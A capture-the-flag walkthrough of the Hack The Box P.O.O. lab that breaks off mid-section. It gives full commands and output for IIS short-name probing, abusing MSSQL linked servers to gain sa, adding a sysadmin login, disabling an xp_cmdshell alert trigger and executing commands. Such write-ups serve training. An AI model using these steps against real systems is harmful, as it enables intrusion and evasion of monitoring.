# HTB Endgame: P.O.O.

[endgame](/tags#endgame ) [ctf](/tags#ctf ) [hackthebox](/tags#hackthebox )
[htb-poo](/tags#htb-poo ) [nmap](/tags#nmap ) [iis](/tags#iis )
[windows](/tags#windows ) [gobuster](/tags#gobuster ) [ds-store](/tags#ds-
store ) [iis-shortname](/tags#iis-shortname ) [wfuzz](/tags#wfuzz )
[mssql](/tags#mssql ) [mssqlclient](/tags#mssqlclient ) [mssql-linked-
servers](/tags#mssql-linked-servers ) [xp-cmdshell](/tags#xp-cmdshell )
[mssql-triggers](/tags#mssql-triggers ) [sp_execute_external_script](/tags#sp-
execute-external-script ) [web.config](/tags#web-config ) [ipv6](/tags#ipv6 )
[winrm](/tags#winrm ) [sharphound](/tags#sharphound )
[bloodhound](/tags#bloodhound ) [kerberoast](/tags#kerberoast ) [invoke-
kerberoast](/tags#invoke-kerberoast ) [hashcat](/tags#hashcat )
[powerview](/tags#powerview ) [juicypotato](/tags#juicypotato ) [active-
directory](/tags#active-directory )  
  
Jun 8, 2020

HTB Endgame: P.O.O.

![](https://0xdfimages.gitlab.io/img/endgame-poo-cover.png)

Endgame Professional Offensive Operations (P.O.O.) was the first Endgame lab
released by HTB. Endgame labs require at least Guru status to attempt (though
now that P.O.O. is retired, it is available to all VIP). The lab contains two
Windows hosts, and I’m given a single IP that represents the public facing
part of the network. To collect all five flags, I’ll take advantage of
DS_STORE files and Windows short filenames to get creds for the MSSQL
instance, abuse trust within MSSQL to escalate my access to allow for code
execution. Basic xp_cmdshell runs as a user without much access, but Python
within MSSQL runs as a more privileged user, allowing me access to a config
file with the administrator credentials. I’ll observe that WinRM is not
blocked on IPv6, and get a shell. To pivot to the DC, I’ll run SharpHound and
see that a kerberoastable user has Generic All on the Domain Admins group, get
the hash, break it, and add that user to DA.

## Lab Details

Name: | [Endgame P.O.O.](https://www.hackthebox.eu/home/endgame/view/1)  
---|---  
Release Date: | [30 Mar 2018](https://twitter.com/hackthebox_eu/status/980009171671310336)  
Retire Date: | [2 June 2020](https://twitter.com/hackthebox_eu/status/1266365505864192000)  
Creators: | [![mrb3n](https://www.hackthebox.com/badge/image/2984) mrb3n](https://app.hackthebox.com/users/2984)  
[![eks](https://www.hackthebox.com/badge/image/302)
eks](https://app.hackthebox.com/users/302)  
  
Hosts: | 

  * POO-DC ![Windows](../img/.png)Windows
  * POO-Compatibility ![Windows](../img/.png)Windows

  
Description: | Professional Offensive Operations is a rising name in the cyber security world.  
  
Lately they've been working into migrating core services and components to a
state of the art cluster which offers cutting edge software and hardware.  
  
P.O.O., is designed to put your skills in enumeration, lateral movement, and
privilege escalation to the test within a small Active Directory environment
configured with the latest and greatest operating systems and technologies.  
  
The goal is to compromise the perimeter host, escalate privileges and
ultimately compromise the domain while collecting several flags along the way.  
  
## Recon

### nmap

`nmap` finds two open TCP ports on the target IP, HTTP (80) and MSSQL (1433):

    
    
    root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.13.38.11
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-14 21:27 EST
    Nmap scan report for 10.13.38.11
    Host is up (0.095s latency).
    Not shown: 65533 filtered ports
    PORT     STATE SERVICE
    80/tcp   open  http
    1433/tcp open  ms-sql-s
    
    Nmap done: 1 IP address (1 host up) scanned in 20.20 seconds
    
    root@kali# nmap -p 80,1433 -sC -sV -oA nmap/tcpscripts 10.13.38.11
    Starting Nmap 7.80 ( https://nmap.org ) at 2019-02-14 22:02 EDT
    Nmap scan report for compatibility.intranet.poo (10.13.38.11)
    Host is up (0.080s latency).
    
    PORT     STATE SERVICE  VERSION
    80/tcp   open  http     Microsoft IIS httpd 10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: IIS Windows Server
    1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.2027.00; RTM+
    | ms-sql-ntlm-info: 
    |   Target_Name: POO
    |   NetBIOS_Domain_Name: POO
    |   NetBIOS_Computer_Name: COMPATIBILITY
    |   DNS_Domain_Name: intranet.poo
    |   DNS_Computer_Name: COMPATIBILITY.intranet.poo
    |   DNS_Tree_Name: intranet.poo
    |_  Product_Version: 10.0.17763
    | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
    | Not valid before: 2019-02-13T13:44:03
    |_Not valid after:  2049-02-13T13:44:03
    |_ssl-date: 2019-02-14T09:07:18+00:00; -58m27s from scanner time.
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    |_clock-skew: mean: -58m27s, deviation: 0s, median: -58m28s
    | ms-sql-info: 
    |   10.13.38.11:1433: 
    |     Version: 
    |       name: Microsoft SQL Server 2017 RTM+
    |       number: 14.00.2027.00
    |       Product: Microsoft SQL Server 2017
    |       Service pack level: RTM
    |       Post-SP patches applied: true
    |_    TCP port: 1433
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 12.90 seconds
    

Based on the [IIS
version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions),
this looks like Windows 10 / Server 2016 / Servier 2019.

### HTTP - TCP 80

#### Site

The site is just the IIS default:

![image-20200606150936265](https://0xdfimages.gitlab.io/img/image-20200606150936265.png)

#### Directory Brute Force

My initial `gobuster` run found one interesting path, `/admin`:

    
    
    root@kali# gobuster -u http://10.13.38.11 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt  -t 50
    
    =====================================================
    Gobuster v2.0.1              OJ Reeves (@TheColonial)
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://10.13.38.11/
    [+] Threads      : 50
    [+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
    [+] Status codes : 200,204,301,302,307,403
    [+] Timeout      : 10s
    =====================================================
    2019/02/15 12:07:05 Starting gobuster
    =====================================================
    /images (Status: 301)
    /templates (Status: 301)
    /themes (Status: 301)
    /admin (Status: 401)
    /uploads (Status: 301)
    /plugins (Status: 301)
    /dev (Status: 301)
    /js (Status: 301)
    /widgets (Status: 301)
    =====================================================
    2019/02/15 12:10:40 Finished
    =====================================================
    

Unfortunately, `/admin` requests basic auth, and without knowing the username,
brute forcing it is tricky. I tried some basic brute force with the username
admin, but didn’t have any success.

On finding little else to play with, I started `gobuster` with larger
wordlists in the background. When I ran with `raft-large-words-lowercase.txt`,
it finds an interesting file, `.ds_store`:

    
    
    root@kali# gobuster dir -u http://10.13.38.11 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -t 50
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.13.38.11
    [+] Threads:        50
    [+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Timeout:        10s
    ===============================================================
    2019/02/15 12:18:44 Starting gobuster
    ===============================================================
    /plugins (Status: 301)
    /js (Status: 301)
    /themes (Status: 301)
    /images (Status: 301)
    /templates (Status: 301)
    /admin (Status: 401)
    /uploads (Status: 301)
    /dev (Status: 301)
    /. (Status: 200)
    /widgets (Status: 301)
    /meta-inf (Status: 301)
    /.ds_store (Status: 200)
    /.trashes (Status: 301)
    ===============================================================
    2020/06/04 12:22:29 Finished
    ===============================================================
    

### .DS_Store Enumeration

`.DS_Store` files are actually [created by
MacOS](https://en.wikipedia.org/wiki/.DS_Store) when it visits a directory.
They store attributes of the folder and the files within it. Likely here the
site was developed on a Mac and then deployed to this Windows server. The
structure of the `.ds_store` file is proprietary, but it has been reversed
(see [this post](https://0day.work/parsing-the-ds_store-file-format/) for an
excellent deep dive).

I first found the [Python-dsstore](https://github.com/gehaxelt/Python-dsstore)
tool to parse `.DS_Store` files, then later learned of
[DS_Walk](https://github.com/Keramas/DS_Walk), which uses `dsstore.py` to
recursively walk a webserver. I’ll clone it into `/opt`, and call it, pointing
at the webserver:

    
    
    root@kali# python /opt/DS_Walk/ds_walk.py -u http://10.13.38.11
    [!] .ds_store file is present on the webserver.
    [+] Enumerating directories based on .ds_server file:
    ----------------------------
    [!] http://10.13.38.11/admin
    [!] http://10.13.38.11/dev
    [!] http://10.13.38.11/iisstart.htm
    [!] http://10.13.38.11/Images
    [!] http://10.13.38.11/JS
    [!] http://10.13.38.11/META-INF
    [!] http://10.13.38.11/New folder
    [!] http://10.13.38.11/New folder (2)
    [!] http://10.13.38.11/Plugins
    [!] http://10.13.38.11/Templates
    [!] http://10.13.38.11/Themes
    [!] http://10.13.38.11/Uploads
    [!] http://10.13.38.11/web.config
    [!] http://10.13.38.11/Widgets
    ----------------------------
    [!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1
    [!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc
    ----------------------------
    [!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/core
    [!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
    [!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/include
    [!] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/src
    ----------------------------
    [!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/core
    [!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db
    [!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/include
    [!] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/src
    ----------------------------
    [!] http://10.13.38.11/Images/buttons
    [!] http://10.13.38.11/Images/icons
    [!] http://10.13.38.11/Images/iisstart.png
    ----------------------------
    [!] http://10.13.38.11/JS/custom
    ----------------------------
    [!] http://10.13.38.11/Themes/default
    ----------------------------
    [!] http://10.13.38.11/Widgets/CalendarEvents
    [!] http://10.13.38.11/Widgets/Framework
    [!] http://10.13.38.11/Widgets/Menu
    [!] http://10.13.38.11/Widgets/Notifications
    ----------------------------
    [!] http://10.13.38.11/Widgets/Framework/Layouts
    ----------------------------
    [!] http://10.13.38.11/Widgets/Framework/Layouts/custom
    [!] http://10.13.38.11/Widgets/Framework/Layouts/default
    ----------------------------
    [*] Finished traversing. No remaining .ds_store files present.
    [*] Cleaning up .ds_store files saved to disk.
    

This gives a pretty clear picture of the directories on the server. One thing
that jumped out is the two directories in `/dev`, both of which look like
md5hashes. Some quick guessing shows that they are actually md5 hashes of the
two creators, `md5(mrb3n) = 304c0c90fbc6520610abbf378e2339d1` and `md5(eks) =
dca66d38fd916317687e1390a420c3fc`.

### IIS Short Names

The other trick needed here is to use a trick to take advantage of Windows
short names, which are referred to as the 8.3 file naming scheme because it
limits each file name to eight characters, a dot, and then a three character
extension. There was a [really interesting
paper](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)
that looks at how IIS handles 8.3 file names in earlier versions of IIS and
.NET. The trick is to look at how the server responds to 8.3 names with
wildcards, which it seems to process when `~` is in the path.

Different servers may require different HTTP request methods to find the
difference. This server doesn’t show the vulnerability with a GET request, but
_does_ show it with an OPTIONS request. For example, I know that there’s a
folder named `templates` in the root directory from `gobuster`. When I make an
OPTIONS request to `http://10.13.38/11/t*~1*/.aspx`, it returns 404. But when
I try `http://10.13.38/11/c*~1*/.aspx`, it returns 200:

    
    
    root@kali# curl -s -I -X OPTIONS 'http://10.13.38.11/c*~1*/.aspx'
    HTTP/1.1 200 OK
    Allow: OPTIONS, TRACE, GET, HEAD, POST
    Server: Microsoft-IIS/10.0
    Public: OPTIONS, TRACE, GET, HEAD, POST
    Date: Thu, 04 Jun 2020 11:25:11 GMT
    Content-Length: 0
    
    root@kali# curl -s -I -X OPTIONS 'http://10.13.38.11/t*~1*/.aspx'
    HTTP/1.1 404 Not Found
    Content-Type: text/html
    Server: Microsoft-IIS/10.0
    Date: Thu, 04 Jun 2020 11:25:17 GMT
    Content-Length: 1245
    

Similarly, I can try each character and see the next character is `s`:

    
    
    root@kali# curl -s -I -X OPTIONS 'http://10.13.38.11/ta*~1*/.aspx'
    HTTP/1.1 200 OK
    Allow: OPTIONS, TRACE, GET, HEAD, POST
    Server: Microsoft-IIS/10.0
    Public: OPTIONS, TRACE, GET, HEAD, POST
    Date: Thu, 04 Jun 2020 11:27:32 GMT
    Content-Length: 0
    
    root@kali# curl -s -I -X OPTIONS 'http://10.13.38.11/tem*~1*/.aspx'
    HTTP/1.1 404 Not Found
    Content-Type: text/html
    Server: Microsoft-IIS/10.0
    Date: Thu, 04 Jun 2020 11:27:36 GMT
    Content-Length: 1245
    

This doesn’t work for all directories / files. It doesn’t find `/admin`,
likely due to permissions. I found a couple tools to do the brute force here.
[This tool](https://github.com/irsdl/IIS-ShortName-Scanner) is the one
associated with the research paper above, but it’s in Java, so I kept looking
and found [this Python
scanner](https://github.com/lijiejie/IIS_shortname_Scanner). When running it
on the root directory, it finds some of the stuff in it:

    
    
    root@kali# python /opt/IIS_shortname_Scanner/iis_shortname_Scan.py http://10.13.38.11/
    Server is vulnerable, please wait, scanning...
    [+] /d~1.*      [scan in progress]
    [+] /n~1.*      [scan in progress] 
    [+] /t~1.*      [scan in progress]
    [+] /w~1.*      [scan in progress]
    [+] /ds~1.*     [scan in progress]
    [+] /ne~1.*     [scan in progress]
    [+] /te~1.*     [scan in progress]    
    [+] /tr~1.*     [scan in progress]
    [+] /we~1.*     [scan in progress]     
    [+] /ds_~1.*    [scan in progress] 
    [+] /new~1.*    [scan in progress]
    [+] /tem~1.*    [scan in progress]
    [+] /tra~1.*    [scan in progress]
    [+] /web~1.*    [scan in progress]
    [+] /ds_s~1.*   [scan in progress]
    [+] /newf~1.*   [scan in progress]
    [+] /temp~1.*   [scan in progress] 
    [+] /tras~1.*   [scan in progress]
    [+] /ds_st~1.*  [scan in progress]
    [+] /newfo~1.*  [scan in progress]          
    [+] /templ~1.*  [scan in progress]
    [+] /trash~1.*  [scan in progress]
    [+] /ds_sto~1.* [scan in progress]
    [+] /newfol~1.* [scan in progress]
    [+] /templa~1.* [scan in progress]
    [+] /trashe~1.* [scan in progress]
    [+] /ds_sto~1   [scan in progress]
    [+] Directory /ds_sto~1 [Done]
    [+] /newfol~1   [scan in progress]
    [+] Directory /newfol~1 [Done]
    [+] /templa~1   [scan in progress]
    [+] Directory /templa~1 [Done]
    [+] /trashe~1   [scan in progress]
    [+] Directory /trashe~1 [Done]
    ----------------------------------------------------------------
    Dir:  /ds_sto~1
    Dir:  /newfol~1
    Dir:  /templa~1
    Dir:  /trashe~1
    ----------------------------------------------------------------
    4 Directories, 0 Files found in total
    Note that * is a wildcard, matches any character zero or more times.
    

I’m not sure why it misses the `.` in front of `.DS_Store`. The script labels
it as directories because in 8.3 if it doesn’t have an extension it’s thought
to be a directory.

More interesting is when I run it against the `/dev` directories. The root
just finds the `.DS_Store` and the two hash directories I know about. In each
of the hash directories it only finds `.DS_Store`. It shows the `src`,
`include`, and `core` directories are not vulnerable. But the `db` directory
shows what looks like the same file in both:

    
    
    root@kali# python /opt/IIS_shortname_Scanner/iis_shortname_Scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db
    Server is vulnerable, please wait, scanning...
    [+] /dev/dca66d38fd916317687e1390a420c3fc/db/p~1.*      [scan in progress]
    [+] /dev/dca66d38fd916317687e1390a420c3fc/db/po~1.*     [scan in progress]
    [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo~1.*    [scan in progress]
    [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_~1.*   [scan in progress]
    [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_c~1.*  [scan in progress]
    [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.* [scan in progress]
    [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.t*        [scan in progress]
    [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.tx*       [scan in progress]
    [+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*      [scan in progress]
    [+] File /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt* [Done]
    ----------------------------------------------------------------
    File: /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*
    ----------------------------------------------------------------
    0 Directories, 1 Files found in total
    Note that * is a wildcard, matches any character zero or more times.
    root@kali# python /opt/IIS_shortname_Scanner/iis_shortname_Scan.py http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
    Server is vulnerable, please wait, scanning...                                                               ...[snip]...
    ----------------------------------------------------------------
    File: /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt*
    ----------------------------------------------------------------
    0 Directories, 1 Files found in total
    Note that * is a wildcard, matches any character zero or more times.
    

### Fuzz File

I know there’s a `.txt` file in `/dev/304c0c90fbc6520610abbf378e2339d1/db/`
that starts with `poo_co`. This is where I can use `wfuzz` to see if I can
find the rest of the filename. I’ll `grep` words that start with `co` from
`raft-large-words-lowercase.txt` which gives a relatively small wordlist to
start with:

    
    
    root@kali# grep "^co" /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt > co_fuzz.txt 
    root@kali# wc -l co_fuzz.txt
    2351 co_fuzz.txt
    

Now I can `wfuzz`:

    
    
    root@kali# wfuzz -c -w co_fuzz.txt -u http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt --hc 404
    
    ********************************************************
    * Wfuzz 2.4.5 - The Web Fuzzer                         *
    ********************************************************
    
    Target: http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt
    Total requests: 2351
    
    ===================================================================
    ID           Response   Lines    Word     Chars       Payload
    ===================================================================
    
    000000097:   200        6 L      7 W      142 Ch      "connection"
    
    Total time: 26.60058
    Processed Requests: 2351
    Filtered Requests: 2350
    Requests/sec.: 88.38152
    

### File and Flag

Grabbing this file (from either `dev` directory) provides connection details
for MSSQL and the first flag, `Recon`:

    
    
    root@kali# curl -s http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_connection.txt
    SERVER=10.13.38.11
    USERID=external_user
    DBNAME=POO_PUBLIC
    USERPWD=#p00Public3xt3rnalUs3r#
    
    Flag : POO{fcfb0767************************}
    

## Huh?!

### Basic MSSQL Enumeration

With the creds from the previous step, I can now connect to the MSSQL instance
on TCP 1433:

    
    
    root@kali# mssqlclient.py external_user:#p00Public3xt3rnalUs3r#@10.13.38.11
    Impacket v0.9.22.dev1+20200422.223359.23bbfbe1 - Copyright 2020 SecureAuth Corporation
    
    [*] Encryption required, switching to TLS
    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
    [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
    [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
    [*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'master'.
    [*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed language setting to us_english.
    [*] ACK: Result: 1 - Microsoft SQL Server (140 7235) 
    [!] Press help for extra shell commands
    SQL>
    

I can do some basic enumeration of the server to get things like the MSSQL
version, the users, and the admin users:

    
    
    SQL> select @@version;
    ------------------------------   
    Microsoft SQL Server 2017 (RTM-GDR) (KB4505224) - 14.0.2027.2 (X64) 
            Jun 15 2019 00:26:19 
            Copyright (C) 2017 Microsoft Corporation
            Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
    
    SQL> SELECT name FROM master..syslogins
    name
    ------------------------------   
    sa
    external_user
    
    SQL> SELECT name FROM master..syslogins WHERE sysadmin = '1';
    name
    ------------------------------   
    sa   
    

The MSSQL version was completely patched at the time of release. There is one
remote code execution / buffer overflow CVE that came out long after I
originally solved, CVE-2018-8273, but I couldn’t find any POCs to play with,
so I’ll leave that alone.

There is one other user on the box, the admin user. My current user is not an
admin. I can enumerate my privileges:

    
    
    SQL> SELECT entity_name, permission_name FROM fn_my_permissions(NULL, 'SERVER');
    entity_name                      permission_name                                                
    ------------------------------   ------------------------------   
    server                           CONNECT SQL    
    

I can list the databases, and find the current one:

    
    
    SQL> SELECT name FROM master..sysdatabases;
    name
    ------------------------------   
    master
    tempdb
    POO_PUBLIC
    
    SQL> SELECT DB_NAME();
    ------------------------------
    master   
    

I went into the various tables and columns for each table, but didn’t find
much that was worth showing.

### Linked Servers

#### Enumeration

[This article](https://blog.netspi.com/how-to-hack-database-links-in-sql-
server/) shows a good walk-through of how to take advantage of SQL Server
links. An SQL Server Link is where an MSSQL server allows a link to an
external data source including other MSSQL servers, Oracle databases, Excel
workbooks, etc. The link describes what resources are accesses and as what
user. That can be taken advantage of if the link is not set up carefully.

The current server is named `POO_PUBLIC`:

    
    
    SQL> select @@servername
    ------------------------------   
    COMPATIBILITY\POO_PUBLIC 
    

To check for linked servers, I’ll query the `sysservers` table (the article
recommends `*`, but I’ll just show the name for readability):

    
    
    SQL> select srvname from sysservers;
    srvname
    ------------------------------   
    COMPATIBILITY\POO_CONFIG
    COMPATIBILITY\POO_PUBLIC  
    

There is another linked remote server, POO_CONFIG.

#### POO_CONFIG

The article uses `openquery` to run queries on other servers. I had mixed
results with that. I found another syntax, `EXECUTE`, to be much more
successful. For example, I can get the server name from POO_CONFIG:

    
    
    SQL> EXECUTE ('select @@servername;') at [COMPATIBILITY\POO_CONFIG];
    ------------------------------   
    COMPATIBILITY\POO_CONFIG 
    

The link is configured to run commands as the `internal_user`:

    
    
    SQL> EXECUTE ('select suser_name();') at [COMPATIBILITY\POO_CONFIG];
    ------------------------------   
    internal_user 
    

Unfortunately, for me, that user is not an admin:

    
    
    SQL> EXECUTE ('SELECT name FROM master..syslogins WHERE sysadmin = ''1'';') at [COMPATIBILITY\POO_CONFIG];
    name
    ------------------------------   
    sa
    
    SQL> EXECUTE ('SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''SERVER'');') at [COMPATIBILITY\POO_CONFIG];
    entity_name                      permission_name                                                
    ------------------------------   ------------------------------   
    server                           CONNECT SQL    
    

I looked at the data in the tables, but didn’t find much.

#### Bounce Back to POO_PUBLIC

Next I tried to have POO_CONFIG run a command on POO_PUBLIC, and it works:

    
    
    SQL> EXEC ('EXEC (''select suser_name();'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
    ------------------------------   
    sa  
    

Not only did it work, but that command is now being run as the sa user! This
mistaken configuration happens because when the two links are created between
the databases, the first is created allowing any user on POO_PUBLIC to run
queries (ie commands) on POO_CONFIG as internal_user. The second must have
been created such that any user on POO_CONFIG is able to run queries on
POO_PUBLIC as sa. This second link might have made sense to an admin
configuring it at the time. Only trusted people will have access to the
internal POO_PUBLIC. It’s easy to forget about the other link.

So when I look at my permissions locally on POO_CONFIG with the current user
I’ve got almost nothing:

    
    
    SQL> EXECUTE ('SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''SERVER'');') at [COMPATIBILITY\POO_CONFIG]
    entity_name                       permission_name
    ------------------------------   ------------------------------
    server                           CONNECT SQL 
    

But when I ask POO_CONFIG to POO_PUBLIC, I’ve got all the permissions:

    
    
    SQL> EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
    entity_name                       permission_name
    ------------------------------   ------------------------------   
    server                           CONNECT SQL                                                    
    server                           SHUTDOWN                                                       
    server                           CREATE ENDPOINT                                                
    server                           CREATE ANY DATABASE                                            
    server                           CREATE AVAILABILITY GROUP                                      
    server                           ALTER ANY LOGIN                                                
    server                           ALTER ANY CREDENTIAL                                           
    server                           ALTER ANY ENDPOINT                                             
    server                           ALTER ANY LINKED SERVER                                        
    server                           ALTER ANY CONNECTION                                           
    server                           ALTER ANY DATABASE                                             
    server                           ALTER RESOURCES                                                
    server                           ALTER SETTINGS                                                 
    server                           ALTER TRACE                                                    
    server                           ALTER ANY AVAILABILITY GROUP                                   
    server                           ADMINISTER BULK OPERATIONS                                     
    server                           AUTHENTICATE SERVER                                            
    server                           EXTERNAL ACCESS ASSEMBLY                                       
    server                           VIEW ANY DATABASE                                              
    server                           VIEW ANY DEFINITION                                            
    server                           VIEW SERVER STATE                                             
    server                           CREATE DDL EVENT NOTIFICATION                                  
    server                           CREATE TRACE EVENT NOTIFICATION                                
    server                           ALTER ANY EVENT NOTIFICATION                                   
    server                           ALTER SERVER STATE                                             
    server                           UNSAFE ASSEMBLY                                                
    server                           ALTER ANY SERVER AUDIT                                         
    server                           CREATE SERVER ROLE                                             
    server                           ALTER ANY SERVER ROLE                                          
    server                           ALTER ANY EVENT SESSION                                        
    server                           CONNECT ANY DATABASE                                           
    server                           IMPERSONATE ANY LOGIN                                          
    server                           SELECT ALL USER SECURABLES                                     
    server                           CONTROL SERVER 
    

### Add sa User

To make life easier, I’ll create a new sa user with a password I know so that
I don’t have to bounce everything.

    
    
    SQL> EXECUTE('EXECUTE(''CREATE LOGIN df WITH PASSWORD = ''''qwe123QWE!@#'''';'') AT [COMPATIBILITY\POO_PUBLIC]') AT [COMPATIBILITY\POO_CONFIG]
    SQL> EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''df'''', ''''sysadmin'''''') AT [COMPATIBILITY\POO_PUBLIC]') AT [COMPATIBILITY\POO_CONFIG]
    

Now I can connect with this new admin account:

    
    
    root@kali# mssqlclient.py 'df:qwe123QWE!@#@10.13.38.11'
    Impacket v0.9.22.dev1+20200422.223359.23bbfbe1 - Copyright 2020 SecureAuth Corporation
    
    [*] Encryption required, switching to TLS
    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
    [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
    [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
    [*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed database context to 'master'.
    [*] INFO(COMPATIBILITY\POO_PUBLIC): Line 1: Changed language setting to us_english.
    [*] ACK: Result: 1 - Microsoft SQL Server (140 7235) 
    [!] Press help for extra shell commands
    SQL> 
    

### New DB - Flag

As sa, I can now access another database, `flag`:

    
    
    SQL> SELECT name FROM master..sysdatabases;
    name
    ------------------------------   
    master
    tempdb
    model
    msdb
    POO_PUBLIC
    flag 
    

I can list the tables and schema:

    
    
    SQL> select table_name,table_schema from flag.INFORMATION_SCHEMA.TABLES;
    table_name                       table_schema   
    ------------------------------   ------------------------------   
    flag                             dbo
    

To query a different DB in MSSQL, it’s `[server].[db].[schema].[table]`. So I
can dump the flag with:

    
    
    SQL> select * from flag.dbo.flag;
    flag                                       
    ----------------------------------------   
    b'POO{88d829eb************************}' 
    

## BackTrack

### Command Execution

#### xp_cmdshell Blocked

Now that I’m sa on the database, I want to get a shell on the host. I’ll try
`xp_cmdshell`, but it fails:

    
    
    SQL> xp_cmdshell whoami
    [-] ERROR(COMPATIBILITY\POO_PUBLIC): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
    

I need to enable it. I’ll try the `enable_xp_cmdshell` macro, but it fails
with an error:

    
    
    SQL> enable_xp_cmdshell
    [*] INFO(COMPATIBILITY\POO_PUBLIC): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
    [-] ERROR(COMPATIBILITY\POO_PUBLIC): Line 11: Attempt to enable xp_cmdshell detected. Database Administrators will be notified!
    [-] ERROR(COMPATIBILITY\POO_PUBLIC): Line 181: The transaction ended in the trigger. The batch has been aborted.
    

I can try the manual way too, but the same error:

    
    
    SQL> sp_configure 'show advanced options', '1'
    [*] INFO(COMPATIBILITY\POO_PUBLIC): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
    SQL> RECONFIGURE
    SQL> sp_configure 'xp_cmdshell', '1' 
    [-] ERROR(COMPATIBILITY\POO_PUBLIC): Line 11: Attempt to enable xp_cmdshell detected. Database Administrators will be notified!
    [-] ERROR(COMPATIBILITY\POO_PUBLIC): Line 181: The transaction ended in the trigger. The batch has been aborted.
    

#### Disable Trigger

These triggers are a policy put in place to alert and block attempts to enable
and use `xp_cmdshell`. The problem is, as sa, I can [disable these
triggers](https://www.mssqltips.com/sqlservertip/2987/can-i-stop-a-system-
admin-from-enabling-sql-server-xpcmdshell/). Triggers are stored in
`sys.server_triggers`:

    
    
    SQL> select name from sys.server_triggers;
    name
    ------------------------------   
    ALERT_xp_cmdshell 
    

Now I just need the [syntax to disable
it](https://blog.netspi.com/maintaining-persistence-via-sql-server-
part-2-triggers/#triggerremoval):

    
    
    SQL> disable trigger ALERT_xp_cmdshell on all server
    

Now I can enable `xp_cmdshell`, and it works:

    
    
    SQL> enable_xp_cmdshell
    [*] INFO(COMPATIBILITY\POO_PUBLIC): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
    [*] INFO(COMPATIBILITY\POO_PUBLIC): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
    SQL> xp_cmdshell whoami
    output                                                                             
    ------------------------------   
    nt service\mssql$poo_public                                                        
    NULL
    

### Escalate to poo_public01

#### Machine Enumeration as mssql$poo_public

mssql$poo_public doesn’t have access to much. There is a home directory, but
it is empty. The user has some access to the web directory, but the most
interesting file, `\inetput\wwwroot\web.config` returns access denied:

    
    
